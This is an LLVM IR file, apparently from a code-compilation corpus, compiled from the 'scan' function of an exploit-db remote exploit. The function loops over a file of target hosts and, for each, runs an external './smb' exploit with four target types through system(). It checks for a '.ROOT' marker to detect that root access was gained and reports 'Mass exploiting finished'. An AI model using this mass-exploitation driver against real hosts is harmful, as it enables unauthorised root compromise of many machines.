; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_55.c_scan.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_55.c_scan.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.stat = type { i32 }

@.str = private unnamed_addr constant [2 x i8] c"r\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [20 x i8] c"File %s not found!\0A\00", align 1
@.str.2 = private unnamed_addr constant [15 x i8] c"./smb %d %s %s\00", align 1
@.str.3 = private unnamed_addr constant [37 x i8] c"\0ATrying get root %s use type %d ...\0A\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c".ROOT\00", align 1
@.str.5 = private unnamed_addr constant [28 x i8] c"\0AMass exploiting finished.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @scan(i8* %0, i8* %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32*, align 8
  %7 = alloca i32*, align 8
  %8 = alloca [512 x i8], align 16
  %9 = alloca [100 x i8], align 16
  %10 = alloca i32, align 4
  %11 = alloca %struct.stat, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %12 = load i8*, i8** %4, align 8
  %13 = call i32* @fopen(i8* %12, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i64 0, i64 0))
  store i32* %13, i32** %6, align 8
  %14 = icmp eq i32* %13, null
  br i1 %14, label %15, label %19

15:                                               ; preds = %2
  %16 = load i32, i32* @stderr, align 4
  %17 = load i8*, i8** %4, align 8
  %18 = call i32 @fprintf(i32 %16, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.1, i64 0, i64 0), i8* %17)
  store i32 -1, i32* %3, align 4
  br label %68

19:                                               ; preds = %2
  br label %20

20:                                               ; preds = %63, %19
  %21 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %22 = load i32*, i32** %6, align 8
  %23 = call i32* @fgets(i8* %21, i32 512, i32* %22)
  %24 = icmp ne i32* %23, null
  br i1 %24, label %25, label %64

25:                                               ; preds = %20
  %26 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %27 = call i32 @strlen(i8* %26)
  %28 = sub nsw i32 %27, 1
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 %29
  %31 = load i8, i8* %30, align 1
  %32 = sext i8 %31 to i32
  %33 = icmp eq i32 %32, 10
  br i1 %33, label %34, label %40

34:                                               ; preds = %25
  %35 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %36 = call i32 @strlen(i8* %35)
  %37 = sub nsw i32 %36, 1
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 %38
  store i8 0, i8* %39, align 1
  br label %40

40:                                               ; preds = %34, %25
  store i32 0, i32* %10, align 4
  br label %41

41:                                               ; preds = %60, %40
  %42 = load i32, i32* %10, align 4
  %43 = icmp slt i32 %42, 4
  br i1 %43, label %44, label %63

44:                                               ; preds = %41
  %45 = getelementptr inbounds [100 x i8], [100 x i8]* %9, i64 0, i64 0
  %46 = load i32, i32* %10, align 4
  %47 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %48 = load i8*, i8** %5, align 8
  %49 = call i32 @sprintf(i8* %45, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.2, i64 0, i64 0), i32 %46, i8* %47, i8* %48)
  %50 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %51 = load i32, i32* %10, align 4
  %52 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.3, i64 0, i64 0), i8* %50, i32 %51)
  %53 = getelementptr inbounds [100 x i8], [100 x i8]* %9, i64 0, i64 0
  %54 = call i32 @system(i8* %53)
  %55 = call i32 @stat(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i64 0, i64 0), %struct.stat* %11)
  %56 = icmp ne i32 %55, -1
  br i1 %56, label %57, label %59

57:                                               ; preds = %44
  %58 = call i32 @unlink(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i64 0, i64 0))
  br label %63

59:                                               ; preds = %44
  br label %60

60:                                               ; preds = %59
  %61 = load i32, i32* %10, align 4
  %62 = add nsw i32 %61, 1
  store i32 %62, i32* %10, align 4
  br label %41

63:                                               ; preds = %57, %41
  br label %20

64:                                               ; preds = %20
  %65 = load i32*, i32** %6, align 8
  %66 = call i32 @fclose(i32* %65)
  %67 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.5, i64 0, i64 0))
  br label %68

68:                                               ; preds = %64, %15
  %69 = load i32, i32* %3, align 4
  ret i32 %69
}

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @fprintf(i32, i8*, i8*) #1

declare dso_local i32* @fgets(i8*, i32, i32*) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, i32, i8*, i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @system(i8*) #1

declare dso_local i32 @stat(i8*, %struct.stat*) #1

declare dso_local i32 @unlink(i8*) #1

declare dso_local i32 @fclose(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
